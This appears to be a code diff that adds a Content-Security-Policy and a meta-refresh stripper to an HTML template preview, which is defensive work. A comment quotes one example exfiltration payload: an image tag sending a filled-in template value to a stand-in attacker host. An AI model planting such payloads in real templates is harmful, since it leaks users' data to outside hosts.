@@ -89,3 +89,23 @@ export function renderTemplate(
         return escapeHtml(formatValue(value, type));
     });
 }
+
+/**
+ * The preview document's Content-Security-Policy. The iframe sandbox blocks scripts, but not
+ * network loads: a pasted template with `<img src="https://evil.example/?x={{tenant_name}}">`
+ * (or a CSS `url()`) would send filled-in values out on every live render, no click needed.
+ * Inline styles and embedded `data:` images/fonts still work; remote resources do not.
+ */
+export const PREVIEW_CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:";
+
+/**
+ * Puts the CSP <meta> first in <head> (after <head>, so a leading <!DOCTYPE> keeps standards
+ * mode) and drops any `<meta http-equiv="refresh">`: CSP cannot stop a refresh from navigating
+ * the frame to a remote URL with filled-in values in its query string.
+ */
+export function withPreviewCsp(html: string): string {
+    const meta = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;
+    const safe = html.replace(/<meta\b[^>]*http-equiv\s*=\s*["']?\s*refresh[^>]*>/gi, '');
+    const head = /<head(\s[^>]*)?>/i; // not <header>
+    return head.test(safe) ? safe.replace(head, (m) => m + meta) : meta + safe;
+}
